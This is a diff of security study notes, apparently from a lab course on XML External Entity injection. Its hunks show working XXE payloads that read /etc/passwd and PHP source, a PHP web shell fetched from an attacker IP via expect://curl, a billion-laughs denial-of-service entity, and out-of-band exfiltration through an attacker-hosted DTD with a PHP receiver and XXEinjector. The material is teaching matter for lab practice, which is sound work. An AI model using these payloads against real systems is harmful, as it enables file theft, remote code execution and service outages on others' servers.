@@ -1,10 +1,8 @@
----
-date: 
-tags:
----
 
-```table-of-contents
-```
+
+
+
+
 
 # Intro
 
@@ -24,7 +22,7 @@ Here we see a basic example of an XML document representing an e-mail document s
 
 Code: xml
 
-```
+```bash
 <?xml version="1.0" encoding="UTF-8"?>
 <email>
   <date>01-01-2022</date>
@@ -67,7 +65,7 @@ Furthermore, some characters are used as part of an XML document structure, like
 
 Code: xml
 
-```
+```bash
 <!DOCTYPE email [
   <!ELEMENT email (date, time, sender, recipients, body)>
   <!ELEMENT recipients (to, cc?)>
@@ -87,7 +85,7 @@ The above DTD can be placed within the XML document itself, right after the `XML
 
 Code: xml
 
-```
+```bash
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email SYSTEM "email.dtd">
 
@@ -97,7 +95,7 @@ It is also possible to reference a DTD through a URL, as follows:
 
 Code: xml
 
-```
+```bash
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email SYSTEM "<http://inlanefreight.com/email.dtd>">
 
@@ -113,7 +111,7 @@ We may also define custom entities (i.e. XML variables) in XML DTDs, to allow re
 
 Code: xml
 
-```
+```bash
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY company "Inlane Freight">
@@ -125,7 +123,7 @@ Once we define an entity, it can be referenced in an XML document between an amp
 
 Code: xml
 
-```
+```bash
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "<http://localhost/company.txt>">
@@ -174,7 +172,7 @@ For now, we know that whatever value we place in the `<email></email>` element g
 
 Code: xml
 
-```
+```bash
 <!DOCTYPE email [
   <!ENTITY company "Inlane Freight">
 ]>
@@ -199,7 +197,7 @@ Now that we can define new internal XML entities let's see if we can define exte
 
 Code: xml
 
-```
+```bash
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///etc/passwd">
 ]>
@@ -230,7 +228,7 @@ Luckily, PHP provides wrapper filters that allow us to base64 encode certain res
 
 Code: xml
 
-```
+```bash
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
@@ -257,7 +255,7 @@ The most efficient method to turn XXE into RCE is by fetching a web shell from o
 
 Local File Disclosure
 
-```
+```bash
 z0mb34r@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
 z0mb34r@htb[/htb]$ sudo python3 -m http.server 80
 
@@ -267,7 +265,7 @@ Now, we can use the following XML code to execute a `curl` command that download
 
 Code: xml
 
-```
+```bash
 <?xml version="1.0"?>
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
@@ -295,7 +293,7 @@ Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to t
 
 Code: xml
 
-```
+```bash
 <?xml version="1.0"?>
 <!DOCTYPE email [
   <!ENTITY a0 "DOS" >
@@ -359,7 +357,7 @@ One easy way to tackle this issue would be to define a `begin` internal entity w
 
 Code: xml
 
-```
+```bash
 <!DOCTYPE email [
   <!ENTITY begin "<![CDATA[">
   <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
@@ -375,7 +373,7 @@ To bypass this limitation, we can utilize `XML Parameter Entities`, a special ty
 
 Code: xml
 
-```
+```bash
 <!ENTITY joined "%begin;%file;%end;">
 
 ```
@@ -384,7 +382,7 @@ So, let's try to read the `submitDetails.php` file by first storing the above li
 
 Advanced File Disclosure
 
-```
+```bash
 z0mb34r@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 z0mb34r@htb[/htb]$ python3 -m http.server 8000
 
@@ -396,7 +394,7 @@ Now, we can reference our external entity (`xxe.dtd`) and then print the `&joine
 
 Code: xml
 
-```
+```bash
 <!DOCTYPE email [
   <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
   <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
@@ -411,13 +409,13 @@ Code: xml
 
 Once we write our
 
-```
+```bash
 xxe.dtd
 ```
 
 file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the
 
-```
+```bash
 submitDetails.php
 ```
 
@@ -441,19 +439,19 @@ If the web application displays runtime errors (e.g., PHP errors) and does not h
 
 Let's consider the exercise we have in
 
-```
+```bash
 /error
 ```
 
 at the end of this section, in which none of the XML input entities is displayed on the screen. Because of this, we have no entity that we can control to write the file output. First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g.
 
-```
+```bash
 <roo>
 ```
 
 instead of
 
-```
+```bash
 <root>
 ```
 
@@ -465,7 +463,7 @@ We see that we did indeed cause the web application to display an error, and it 
 
 Code: xml
 
-```
+```bash
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 
@@ -477,7 +475,7 @@ Now, we can call our external DTD script, and then reference the `error` entity,
 
 Code: xml
 
-```
+```bash
 <!DOCTYPE email [
   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
   %remote;
@@ -488,7 +486,7 @@ Code: xml
 
 Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the
 
-```
+```bash
 /etc/hosts
 ```
 
@@ -538,7 +536,7 @@ To do so, we can first use a parameter entity for the content of the file we are
 
 Code: xml
 
-```
+```bash
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 
@@ -548,7 +546,7 @@ If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, 
 
 Code: php
 
-```
+```bash
 <?php
 if(isset($_GET['content'])){
     error_log("\\\\n\\\\n" . base64_decode($_GET['content']));
@@ -561,7 +559,7 @@ So, we will first write the above PHP code to `index.php`, and then start a PHP 
 
 Blind Data Exfiltration
 
-```
+```bash
 z0mb34r@htb[/htb]$ vi index.php # here we write the above PHP code
 z0mb34r@htb[/htb]$ php -S 0.0.0.0:8000
 
@@ -573,7 +571,7 @@ Now, to initiate our attack, we can use a similar payload to the one we used in 
 
 Code: xml
 
-```
+```bash
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
@@ -592,7 +590,7 @@ Finally, we can go back to our terminal, and we will see that we did indeed get 
 
 Blind Data Exfiltration
 
-```
+```bash
 PHP 7.4.3 Development Server (<http://0.0.0.0:8000>) started
 10.10.14.16:46256 Accepted
 10.10.14.16:46256 [200]: (null) /xxe.dtd
@@ -618,7 +616,7 @@ To use this tool for automated OOB exfiltration, we can first clone the tool to 
 
 Blind Data Exfiltration
 
-```
+```bash
 z0mb34r@htb[/htb]$ git clone <https://github.com/enjoiz/XXEinjector.git>
 
 Cloning into 'XXEinjector'...
@@ -630,7 +628,7 @@ Once we have the tool, we can copy the HTTP request from Burp and write it to a 
 
 Code: http
 
-```
+```bash
 POST /blind/submitDetails.php HTTP/1.1
 Host: 10.129.201.94
 Content-Length: 169
@@ -652,7 +650,7 @@ Now, we can run the tool with the `--host`/`--httpport` flags being our IP and p
 
 Blind Data Exfiltration
 
-```
+```bash
 z0mb34r@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 
 ...SNIP...
@@ -666,7 +664,7 @@ We see that the tool did not directly print the data. This is because we are bas
 
 Blind Data Exfiltration
 
-```
+```bash
 z0mb34r@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log
 
 root:x:0:0:root:/root:/bin/bash
